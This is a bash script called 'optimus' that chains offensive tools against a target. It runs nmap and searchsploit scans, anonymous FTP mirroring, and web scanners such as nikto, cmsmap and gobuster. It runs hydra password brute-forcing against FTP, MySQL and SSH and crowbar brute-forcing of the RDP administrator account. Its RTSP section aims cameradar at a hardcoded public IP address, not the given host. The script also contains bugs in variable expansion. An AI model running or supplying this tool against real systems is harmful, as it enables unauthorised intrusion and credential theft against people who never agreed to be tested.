#!/usr/bin/bash

#Flags:

#The u: means u will need a value if called
#Example for 4 flags parameters:

users="/root/Documents/Attacks/Bruteforce/commonUserShort.txt"
passwords="/root/Documents/Attacks/Bruteforce/rockyou-50.txt"

orange='\033[93m' 

while getopts t:r:p:hfl:u: option
do
	case "${option}"
		in
		t) host=${OPTARG};;
		r) protocol=${OPTARG};;
		p) port=${OPTARG};;
		l) threads=${OPTARG};;
		f) full="true";;
		u) url=${OPTARG};;
		h)  echo -e "$orange\nusage: optimus [-t host/ip][-r protocol][-p port][-l treads], -h for help
Options -f - full scan

Currently supported protocols: 
ftp
mysql
rtsp
ssh
Http Example: use optimus -r http -p port -u
use 'host' protocol to specify full vulnscan\n

The following protocols arent complete:

rdp\n
" && exit

	esac
done

# nmap stuff 

mkdir optimus_nmap exploits sqlrequests


##########################################################################################################################################################

# HOST + # General cross protocol check

if [ "$protocol" == "host" ]
then

	nmap $host -p- -sV -A -Pn -oA optimus_nmap/optimus_nmap_$protocol_$port 

	searchsploit --nmap optimus_nmap/optimus_nmap_$protocol_$port.xml -v 

elif [ "$protocol" == "http" ] # http is url based not host based so nmap altered

then

	#var declarations
	
	IFS='//' read -ra hostname <<< "$url" # $url = https://www.site.com

	domain="${hostname[2]}" # aka www.site.com

	echo "nmap $domain -p $port -sV -A -Pn -oA optimus_nmap/optimus_nmap_$protocol_$port # -A as vuln"

	nmap $domain -p $port -sV -A -Pn -oA optimus_nmap/optimus_nmap_$protocol_$port # -A as vuln

else
	
	nmap $host -p $port -sV -A -Pn -oA optimus_nmap/optimus_nmap_$protocol_$port 

	searchsploit --nmap optimus_nmap/optimus_nmap_$protocol_$port.xml -v 

fi

##########################################################################################################################################################

# RTSP

#HTTP like streaming protocol
#cameradar brute forces paths and credentials

if [ "$protocol" == "rtsp" ]
then

	docker pull ullaakut/cameradar
	docker run -t ullaakut/cameradar -t 69.164.139.18 -p $port -s 3 -T 6s -d
	
fi

# python rtsp_authgrind [- l username | -L username list file] [-p password 
# | -P password list file] <target ip [:port]> for possible full feature/when have user pass list

##########################################################################################################################################################

# FTP

#Anonymoius logon+
#file pulling
#Bruteforce


if [ "$protocol" == "ftp" ]
then

	wget -m ftp://anonymous:anonymous@$host --no-passive

	if [ "$full" == "true" ]
	then
# Hydra bruteforce
		hydra -L $users -P $passwords -t $threads  $protocol://$host:$port -vvv
	fi
fi

##########################################################################################################################################################

# MYSQL

#Bruteforce

if [ "$protocol" == "mysql" ]
then

	echo "In mysql we can only do bruteforce beyond the vuln scan, use -f to run brute force"

	if [ "$full" == "true" ]
	then
#Hydra bruteforce
		hydra -L $users -P $passwords -t $threads  $protocol://$host:$port -vvv
	fi
fi


##########################################################################################################################################################

# SSH

#Bruteforce only atm

if [ "$protocol" == "ssh" ]
then

	echo "In ssh we can only do bruteforce beyond the vuln scan, use -f to run brute force"

	if [ "$full" == "true" ]
	then
#Hydra bruteforce
		hydra -L $users -P $passwords -t $threads  $protocol://$host:$port -vvv
	fi
fi

##########################################################################################################################################################

# RDP

#Bruteforce only atm

if [ "$protocol" == "rdp" ]
then

	echo "In rdp we can only do bruteforce beyond the vuln scan, use -f to run brute force, use the x.x.x.x/32 as target\n
	The default user is administrator."

	if [ "$full" == "true" ]
	then
	
#crowbar bruteforce

		crowbar -b rdp -s  $host -u administrator -C $passwords
	fi
fi

##########################################################################################################################################################

# HTTP

if [ "$protocol" == "http" ]
then

	echo "$orange Starting http/https analysis:"

	if [ "${hostname[0]}" == "https:" ]
	then
		sslscan $url

		yawast ssl $url --tdessessioncount 
	fi

	wafw00f $url

	robocop -u $url # Runs over disallow entries of the robots.txt of the url(if exists) and opens non 40X/50X urls.

	cmsmap -s $url

	corsed -u $url # try get corsed output

	nikto -Display 1234EP -o nikto.html -Format htm -Tuning 123bde -host $url -C all

	bfac -u $url

	if [ "$full" == "true" ] # This is for dirb attacking
	
	then
		read -p 'Threads number for gobuster?: ' threads
		
		gobuster dir -u $url -w /root/Documents/Attacks/GoBusterWordlists/dirb/mini.txt -o gobuster_all.result_$d -t $threads --wildcard

		for i in $(cat gobuster_* | awk -F" " '{print $1}' | sort -u); do firefox $url$i; done

	fi
fi
